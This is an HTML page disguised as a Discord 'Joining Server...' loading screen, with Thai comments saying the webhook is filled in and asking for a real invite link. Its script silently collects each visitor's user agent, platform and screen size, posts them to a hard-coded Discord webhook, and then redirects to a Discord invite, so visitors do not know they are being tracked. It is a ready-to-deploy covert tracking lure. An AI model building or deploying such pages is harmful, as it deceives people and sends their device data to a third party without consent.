<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Joining Server...</title>
    <style>
        body { background-color: #36393f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #202225; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
        p { margin-top: 20px; color: #b9bbbe; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p>Redirecting to server...</p>
    </div>

    <script>
        // Webhook ของคุณใส่ไว้ให้แล้ว
        const webhookURL = 'https://discord.com/api/webhooks/1561646198799073291/WfnNkRIPj7Y9vKheap_1wU11oxwwV_RT1ikuWibzzzDY_ZLo7LTNVb6X9Roni6KVaH6L'; 
        
        // สำคัญมาก: เปลี่ยนลิงก์ด้านล่างนี้เป็นลิงก์เชิญ Discord จริงที่คุณจะให้มันเด้งไป
        const redirectURL = 'https://discord.gg/ใส่ลิงก์เชิญจริงของคุณตรงนี้';

        // ดึงข้อมูลเบื้องต้น
        const data = {
            content: `**มีคนกดลิงก์!**\n**User Agent:** ${navigator.userAgent}\n**Platform:** ${navigator.platform}\n**Screen:** ${window.screen.width}x${window.screen.height}`
        };

        // ส่งข้อมูลเข้า Discord
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            window.location.href = redirectURL;
        }).catch(() => {
            window.location.href = redirectURL;
        });
    </script>
</body>
</html>
